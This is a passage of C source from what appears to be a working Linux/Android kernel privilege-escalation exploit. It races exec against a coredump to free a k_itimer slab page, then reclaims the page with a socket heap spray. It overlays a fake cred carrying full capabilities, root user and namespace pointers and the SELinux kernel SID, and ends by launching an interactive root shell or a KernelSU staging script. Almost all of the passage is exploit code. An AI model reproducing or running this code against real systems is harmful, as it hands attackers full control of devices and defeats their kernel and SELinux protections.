    while (!atomic_load(&g_stop_spray) && w < g_spray_pre + g_spray_post)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2], arm_p[2];
    long t_arm = -1, t_go = 0;
    memset(res, 0, sizeof(*res));
    memset(&g_tax, 0, sizeof(g_tax)); /* V3B: per-attempt classification */
    {
        /* TAXONOMY BUILD: 0/0 forces the B-free state (page frees, no spray
         * can take it), which is what the reap-cost test needs. */
        const char *e = getenv("TIMER_SPRAY_PRE");

        if (e)
            g_spray_pre = atoi(e);
        if ((e = getenv("TIMER_SPRAY_POST")))
            g_spray_post = atoi(e);
        if ((e = getenv("TIMER_SPRAY_EARLY")))
            g_spray_early = atoi(e);
        if ((e = getenv("TIMER_LOG_ON_VICTIM")))
            g_log_on_victim = atoi(e);
        if ((e = getenv("TIMER_GATE")))
            g_gate_env = atoi(e);
        /* The 5.10 (core_state) scheduling default, 2026-11-21: quiet victim
         * + no dump.  The killable path keeps its own (sched_yield) schedule
         * so the 6.1/6.6 behaviour is unchanged.  Env overrides both ways. */
        if ((e = getenv("TIMER_SPRAY_IDLE")))
            g_spray_idle = atoi(e);
        else if (TRIGGER == TRIGGER_CORE_STATE)
            g_spray_idle = 1;
        if ((e = getenv("TIMER_LEADER_AWAY")))
            g_leader_away = atoi(e);
        else if (TRIGGER == TRIGGER_CORE_STATE)
            g_leader_away = 1;
        if ((e = getenv("TIMER_KILL_DUMP")))
            g_kill_dump = atoi(e);
        else if (TRIGGER == TRIGGER_CORE_STATE)
            g_kill_dump = 1;
        if ((e = getenv("TIMER_STAGE_ATTEMPTS")))
            g_stage_attempts = atoi(e);
        if (g_stage_attempts < 1)
            g_stage_attempts = 1;
    }
    logf("[+] spray schedule: %s (pre=%d post=%d) main_on_victim=%d gate=%d idle=%d leader_away=%d kill_dump=%d\n",
         g_spray_early ? "early-continuous" : "after-zombie+free-event",
         g_spray_pre, g_spray_post, g_log_on_victim, g_gate_env, g_spray_idle,
         g_leader_away, g_kill_dump);
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go) ||
        pipe(arm_p))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        close(arm_p[0]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        /* Only the early schedule uses the arm signal; without a reader on
         * the other end the write would get EPIPE. */
        if (g_spray_early)
            g_arm_w = arm_p[1];
        else
            close(arm_p[1]);
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    close(arm_p[1]);
    g_timer_go_w = timer_go[1];
    /* In the early schedule the parent waits for the exec thread's arm; the
     * legacy schedule has no reader, so the read end is closed here. */
    if (g_spray_early)
        g_arm_r = arm_p[0];
    else
        close(arm_p[0]);
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    struct plant_ids ids = {0, 0, 0};
    int etid = 0;
    if (read(tid_p[0], &ids, sizeof(ids)) != sizeof(ids))
        logf("[-] exec tid not received\n");
    etid = ids.tid;
    /* The exec thread passes the helper pids over the tid pipe; the sentinel
     * is the only mm user whose SIGKILL is set by the coredump's zap (and by
     * nothing else), so its pending bit marks the zap.  Poll it and kill the
     * dumper; the dump's page-cache writes are the post-free splitter. */
    if (g_kill_dump && TRIGGER == TRIGGER_CORE_STATE)
    {
        static struct kill_args ka;
        pthread_t kth;

        g_dump_kill_seen = -1;
        g_dump_kill_pid = 0;
        ka.target = (int)T;
        ka.crasher = ids.crasher;
        ka.sentinel = ids.sentinel;
        if (!pthread_create(&kth, NULL, kill_dump_thread, &ka))
            pthread_detach(kth);
        else
            logf("[!] dump kill: thread spawn failed\n");
    }

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpus.victim, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xffffffc000000000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    /*
     * The victim slab must be ours end to end: a single foreign k_itimer in
     * the same 8 KiB page keeps it off the buddy list forever, so the burst
     * can never see it (free_seen=0).  Draw again instead of racing a page
     * that cannot free.
     */
    /* A slab not fully ours is not a reason to abort -- it is one of the
     * reasons the page cannot reach the buddy, and the taxonomy records it. */
    if (slab_own < (int)(0x2000 / TIMER_ALLOC))
        logf("[tax] victim slab not fully ours (%d/%d); continuing\n",
             slab_own, (int)(0x2000 / TIMER_ALLOC));
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    g_slide = site0 - STATIC_TIMER_SITE;

    {
        size_t off = (size_t)((V & 0x1fff) + g_timer_node_off);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            unsigned long long page = V & ~0x1fffULL;
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            size_t cred_end = 0x10; /* usage + uid/gid */
            int fit = 0;

#define CRED_END(offset, size)                                                \
    do                                                                        \
    {                                                                         \
        if ((size_t)(offset) + (size) > cred_end)                             \
            cred_end = (size_t)(offset) + (size);                             \
    } while (0)
            CRED_END(g_cred.caps_offset, (size_t)g_cred.caps_count * 8);
            CRED_END(g_cred.security_offset, 8);
            CRED_END(g_cred.user_offset, 8);
            CRED_END(g_cred.group_info_offset, 8);
            if (g_cred.user_ns_offset)
                CRED_END(g_cred.user_ns_offset, 8);
            if (g_cred.ucounts_offset)
                CRED_END(g_cred.ucounts_offset, 8);
            if (cred_end > CRED_REQ)
                cred_end = CRED_REQ;
#undef CRED_END
            if (off + cred_end > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b + 0x40 <= off || off + cred_end <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            build_payload(payload, off, V + g_timer_node_off, target);
            /*
             * The payload starts zeroed, so usage, uid..fsgid and securebits
             * are 0; rb_erase dirties uid/gid with the node address and the
             * later zero plants repair them.  The overlay supplies the caps,
             * the four identity pointers and the SELinux SID.
             */
            for (unsigned i = 0; i < g_cred.caps_count; i++)
                *(unsigned long long *)(payload + off + g_cred.caps_offset +
                                        i * 8) = FULLCAP;
            *(unsigned long long *)(payload + off + g_cred.security_offset) =
                page + blob;
            *(unsigned long long *)(payload + off + g_cred.user_offset) =
                ROOT_USER_STATIC + g_slide;
            if (g_cred.user_ns_offset)
                *(unsigned long long *)(payload + off +
                                        g_cred.user_ns_offset) =
                    INIT_USER_NS_STATIC + g_slide;
            if (g_cred.ucounts_offset)
                *(unsigned long long *)(payload + off +
                                        g_cred.ucounts_offset) =
                    INIT_UCOUNTS_STATIC + g_slide;
            *(unsigned long long *)(payload + off + g_cred.group_info_offset) =
                INIT_GROUPS_STATIC + g_slide;
            *(unsigned int *)(payload + blob) = SELINUX_SID_KERNEL; /* osid */
            *(unsigned int *)(payload + blob + g_cred.sid_offset) =
                SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
                 tag, off, blob, page + blob);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
             "recs=%d slab_own=%d/%d base=%#llx\n",
             tag, V, V + g_timer_node_off, pfn, slab_pfn, g_slide, nrec,
             slab_own, (int)(0x2000 / TIMER_ALLOC), g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;
        int ncpu = 0, cpus[TRACE_CPUS];

        if (g_spray_early)
        {
            /*
             * The early spray runs while the trigger race is being decided,
             * so it must not take CPU time from any participant: the victim
             * CPU (exec thread, crasher), the lockers' CPUs (their mprotect
             * cadence is what makes the coredump's write lock queue first)
             * or the logger (the parent's arm/zombie/scan latency).  The
             * freed page is in the zone's shared buddy lists, so any other
             * CPU's order-1 request can take it.
             */
            for (int i = 0; i < g_n_avail; i++)
            {
                int c = g_avail[i], used = 0;

                if (c == g_cpus.victim || c == g_cpus.log)
                    used = 1;
                for (int k = 0; k < g_cpus.n_locker; k++)
                    if (c == g_cpus.locker[k])
                        used = 1;
                if (!used)
                    cpus[ncpu++] = c;
            }
            if (!ncpu)
                for (int i = 0; i < g_n_avail; i++)
                    if (g_avail[i] != g_cpus.victim)
                        cpus[ncpu++] = g_avail[i];
            if (!ncpu)
                cpus[ncpu++] = g_cpus.victim;
            logf("[+] early spray cpus");
            for (int i = 0; i < ncpu; i++)
                logf(" %d", cpus[i]);
            logf("\n");
        }
        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = g_spray_early ? cpus[i % ncpu]
                                        : g_cpus.spray[i % g_cpus.n_spray];
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    if (g_timer_go_w >= 0)
    {
        /* R3b.3: the timing instrument and the old tool's on-victim polling. */
        t_go = now_ms();
        if (g_log_on_victim)
            pin_role(g_cpus.victim, "main-plant");
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }
    if (g_spray_early)
    {
        /* R3b.2: start the stream on the arm signal (written by the exec
         * thread just before execve), so the whole budget covers the free
         * window instead of the lockers' and the spin's run-up. */
        if (g_arm_r >= 0)
        {
            struct pollfd pf = {.fd = g_arm_r, .events = POLLIN};

            if (poll(&pf, 1, 5000) > 0)
            {
                char a;

                (void)read(g_arm_r, &a, 1);
                t_arm = now_ms();
            }
            else
                logf("[!] plant%d arm signal timeout; spraying anyway\n",
                     tag);
            close(g_arm_r);
            g_arm_r = -1;
        }
        atomic_store(&g_burst, 1);
    }

    siginfo_t si;
    unlink("core"); /* a stale dump from an earlier attempt */
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_burst, 1); /* TAXONOMY BUILD: unblock the sprayers */
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        if (g_log_on_victim)
            pin_role(g_cpus.log, "main");
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (t_arm >= 0)
        logf("[+] plant%d arm->zombie %ld ms\n", tag, now_ms() - t_arm);
    if (g_dump_kill_seen >= 0)
        logf("[+] dump kill: %s -> crasher=%d\n",
             g_dump_kill_seen ? "zap seen; SIGKILL" : "zap not seen",
             g_dump_kill_pid);
    if (t_go > 0)
        logf("[+] plant%d go->zombie %ld ms\n", tag, now_ms() - t_go);
    if (g_log_on_victim)
        pin_role(g_cpus.log, "main");
    /*
     * The killable trigger dies by the killer's SIGKILL; the core_state
     * trigger dies by the coredump's zap of the shared mm (the crash signal),
     * which waitid reports as CLD_DUMPED.
     */
    if (si.si_code != CLD_KILLED &&
        !(TRIGGER == TRIGGER_CORE_STATE && si.si_code == CLD_DUMPED &&
          si.si_status == SIGSEGV))
    {
        atomic_store(&g_burst, 1); /* TAXONOMY BUILD: unblock the sprayers */
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        return;
    }
    atomic_store(&g_burst, 1);
    /*
     * Phase 1 is already spraying.  When the victim page's free event is
     * seen, release phase 2 immediately: detecting the free before the
     * allocation would otherwise leave the page to the next caller.  This is
     * the product scheduling; the W2-D taxonomy build's fixed blind delay is
     * not used here (it exists to describe a tracefs-less variant).
     */
    long t1 = now_ms();
    int hit = 0;

    if (g_t_page_free)
        logf("[+] schedule: phase2 on the free event (id=%u)\n", g_t_page_free);
    else
        logf("[+] schedule: free event disabled; phase 1 only\n");
    {
        char tids[160];
        int off = 0;

        for (int i = 0; i < SPRAY_THREADS; i++)
            off += snprintf(tids + off, sizeof(tids) - (size_t)off, "%s%d",
                            i ? "," : "", atomic_load(&g_spray_tids[i]));
        logf("[tax] spray tids %s\n", tids);
    }
    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ev(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
                break;
            }
            if (!free_seen && scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m <= 0)
            continue;
        if (scan_page_alloc_ev(raw, (size_t)m, slab_pfn))
            hit = 1;
        else if (!free_seen && scan_page_free(raw, (size_t)m, slab_pfn))
            free_seen = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d foreign=%d after %ldms\n",
         tag, free_seen, hit, g_tax.foreign_pid, now_ms() - t1);
    logf("[trace] cumulative cpus %d/%d: dropped=%ld/%ld overrun=%ld/%ld\n",
         g_cpus.victim, g_cpus.log,
         trace_stat(g_cpus.victim, "dropped events"),
         trace_stat(g_cpus.log, "dropped events"),
         trace_stat(g_cpus.victim, "overrun"),
         trace_stat(g_cpus.log, "overrun"));
    if (g_tax.hit)
        logf("[tax] HIT frag: pfn=%#llx pid=%d gfp=%#llx\n",
             slab_pfn, g_tax.hit_pid, g_tax.hit_gfp);
    if (g_tax.slab_pid)
        logf("[tax] H2 slab-page: pfn=%#llx pid=%d gfp=%#llx (no payload)\n",
             slab_pfn, g_tax.slab_pid, g_tax.slab_gfp);
    if (g_tax.foreign_pid)
        logf("[tax] B foreign: pfn=%#llx pid=%d gfp=%#llx\n",
             slab_pfn, g_tax.foreign_pid, g_tax.foreign_gfp);
    if (g_tax.split_pid)
        logf("[tax] S split: pfn=%#llx pid=%d spray=%d gfp=%#llx half=%d "
             "node_half=%d\n",
             g_tax.split_pfn, g_tax.split_pid, is_spray_tid(g_tax.split_pid),
             g_tax.split_gfp, g_tax.split_half, (int)((V >> 12) & 1));
    if (g_tax.block_pid)
        logf("[tax] L block: pfn=%#llx pid=%d order=%u block_pfn=%#llx\n",
             slab_pfn, g_tax.block_pid, g_tax.block_order, g_tax.block_pfn);
    if (!hit)
    {
        /* Classify for the record; the reap stays gated on the frag hit, so
         * the fatal case is never reaped.  A burst miss is retryable: the
         * zombie is held and the stage draws a new victim (the original
         * PoC's behaviour, not the taxonomy build's end-the-attempt). */
        if (!free_seen)
            logf("[tax] A unseen: pfn=%#llx free record not observed "
                 "(free_id=%u) and no allocation observed (slab_own=%d/%d)\n",
                 slab_pfn, g_t_page_free, slab_own,
                 (int)(0x2000 / TIMER_ALLOC));
        else if (!g_tax.slab_pid && !g_tax.foreign_pid && !g_tax.split_pid &&
                 !g_tax.block_pid)
            logf("[tax] B free: pfn=%#llx freed, not reallocated\n", slab_pfn);
        g_held++;
        res->retry = 1;
        if (getenv("TIMER_REAP_FREE") && free_seen && !g_tax.slab_pid &&
            !g_tax.foreign_pid && !g_tax.split_pid && !g_tax.block_pid)
        {
            /* ROOTED TEST: deliberately reap a B-free page.  The node still
             * holds its original k_itimer bytes, so this is the cheapest way
             * to learn whether the erase on an untouched stale node is benign.
             * Run only with panic_on_oops=0. */
            int st = 0;

            logf("[tax] B-free reap: waitpid now\n");
            if (waitpid(T, &st, 0) == T)
                logf("[tax] B-free reap returned status=%#x\n", st);
            else
                logf("[tax] B-free reap waitpid errno=%d\n", errno);
            res->ok = 1;
            free(payload);
            return;
        }
        free(payload);
        logf("[-] plant%d burst missed; holding zombie, retryable\n", tag);
        return;
    }

    usleep(1000);
    if (getenv("TIMER_TRACE_KEEP"))
        wr(TR "/tracing_on", "1"); /* diagnostic: record the reap's probes */
    int st = 0;
    waitpid(T, &st, 0);
    if (getenv("TIMER_TRACE_KEEP"))
        wr(TR "/tracing_on", "0"); /* freeze the reap's probe records */
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = V + g_timer_node_off;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        int wfd = -1;
        volatile unsigned *wake = NULL;

        if (g_spin_wake)
        {
            wfd = wake_create();
            if (wfd >= 0)
            {
                void *wp = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                MAP_SHARED, wfd, 0);

                if (wp == MAP_FAILED)
                {
                    close(wfd);
                    wfd = -1;
                }
                else
                {
                    memset(wp, 0, 4096);
                    wake = wp;
                    wake[WAKE_CPU] = (unsigned)wake_cpu();
                }
            }
            if (!wake)
                logf("[wake] spin page unavailable; pipe wake\n");
        }
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin_role(g_cpus.victim, "leak child");
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *av[9];
                char warg[16] = "";
                int n = 0;
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                av[n++] = (char *)"/proc/self/exe";
                if (g_profile_path)
                {
                    av[n++] = (char *)"--profile";
                    av[n++] = (char *)g_profile_path;
                }
                av[n++] = (char *)"wait";
                av[n++] = (char *)cmode;
                if (wfd >= 0)
                {
                    snprintf(warg, sizeof warg, "%d", wfd);
                    av[n++] = warg;
                }
                av[n] = NULL;
                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            if (wake)
                munmap((void *)wake, 4096);
            if (wfd >= 0)
                close(wfd);
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        /*
         * The fork's task_struct allocation ran in this (logger) process
         * before the fork; the child's exec cred allocation ran on the
         * victim CPU.  Concatenate both buffers -- the scans filter by pid.
         */
        n = read_cpu(g_cpus.log, raw,
                     (g_cpus.victim != g_cpus.log ? 24u : 48u) << 20);
        if (g_cpus.victim != g_cpus.log)
        {
            size_t off = n > 0 ? (size_t)n : 0;
            long n2 = read_cpu(g_cpus.victim, raw + off,
                               (48u << 20) - off);

            if (n2 > 0)
                n += n2;
        }
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
            if (getenv("TIMER_DIAG_TASK"))
                diag_task_scan(raw, (size_t)n, getpid());
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                if (wake)
                {
                    int ready = 0;

                    for (int i = 0; i < 2000 && !ready; i++)
                    {
                        if (__atomic_load_n(&wake[WAKE_READY], __ATOMIC_ACQUIRE))
                            ready = 1;
                        else
                            usleep(1000);
                    }
                    if (ready)
                        logf("[wake] child spinning on cpu=%u\n", wake[WAKE_CPU]);
                    else
                        logf("[wake] child did not report ready; pipe wake\n");
                }
                g_wake_page = wake;
                g_wake_fd = wfd;
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        if (wake)
            munmap((void *)wake, 4096);
        if (wfd >= 0)
            close(wfd);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(const char *mode, int wake_fd)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;
    volatile unsigned *wake = NULL;

    /* The leak child was pinned to the victim CPU for the exec's cred
     * allocation; with the spin wake it is re-pinned off the trigger's CPUs
     * and waits in user space.  Both are settled before the hello. */
    if (wake_fd >= 0)
    {
        void *wp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                        wake_fd, 0);

        if (wp == MAP_FAILED)
            logf("[wake] child mmap failed (%s); pipe wake\n", strerror(errno));
        else
        {
            wake = wp;
            unsigned cpu = __atomic_load_n(&wake[WAKE_CPU], __ATOMIC_ACQUIRE);
            if (cpu < CPU_SETSIZE)
            {
                cpu_set_t set;

                CPU_ZERO(&set);
                CPU_SET((int)cpu, &set);
                (void)sched_setaffinity(0, sizeof set, &set);
            }
        }
    }
    /* The affinity was set before execve (pin_role in leak_cred) and execve
     * preserves it; this process never derives the layout. */
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (wake)
    {
        int got = 0;

        __atomic_store_n(&wake[WAKE_READY], 1u, __ATOMIC_RELEASE);
        for (unsigned long long spin = 0; spin < (1ULL << 36); spin++)
        {
            if (__atomic_load_n(&wake[WAKE_GO], __ATOMIC_ACQUIRE))
            {
                got = 1;
                break;
            }
            __asm__ volatile("" ::: "memory");
        }
        if (!got)
            _exit(133);
    }
    else if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    if (rep.uid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        int st = 0;
        pid_t w;

        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[fake] child uid=%d euid=%d; forking worker\n",
             rep.uid, rep.euid);
        w = fork();
        if (w == 0)
        {
            char *const av[] = {(char *)"sh",
                                (char *)"/data/local/tmp/ksu_stage.sh", NULL};

            execve("/system/bin/sh", av, envp);
            _exit(127);
        }
        if (w > 0)
            waitpid(w, &st, 0);
        logf("[fake] worker exit=%#x\n", st);
        _exit(0);
    }

    /*
     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
     * across execve(), cap_bprm's setgid downgrade intersects permitted with
     * the old (empty) set and the expanded bset never becomes effective.
     */
    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", (char *)"-i", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}


/*
 * `timer probe` — the runtime half of the profile loop.  Prints the facts a
 * profile is checked against, in the `--runtime-facts` grammar, on stdout;
 * notes go to stderr so `timer probe > facts.txt` is a clean input file.
 * Uses TIMER_ORIGIN (qemu|device) for the origin, default device.
 */
static void probe_note(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
